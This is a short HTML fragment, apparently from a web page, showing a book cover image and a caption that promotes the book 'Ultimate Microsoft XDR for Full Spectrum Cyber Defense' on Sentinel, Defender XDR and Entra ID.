      src="/assets/img/Ultimate%20XDR%20for%20Full%20Spectrum%20Cyber%20Defense/cover11.jpg"
      alt="Ultimate Microsoft XDR for Full Spectrum Cyber Defense"
      style="max-width: 340px; box-shadow: 0 16px 40px rgba(0,0,0,.45); border-radius: 8px;"
    />
  </a>
  <p style="margin-top: 0.75em; font-size: 0.95em; opacity: 0.85;">
    📖 <strong>Ultimate Microsoft XDR for Full Spectrum Cyber Defense</strong><br/>
    Real-world detections, Sentinel, Defender XDR, and Entra ID — end to end.
  </p>
</div>

<br/>
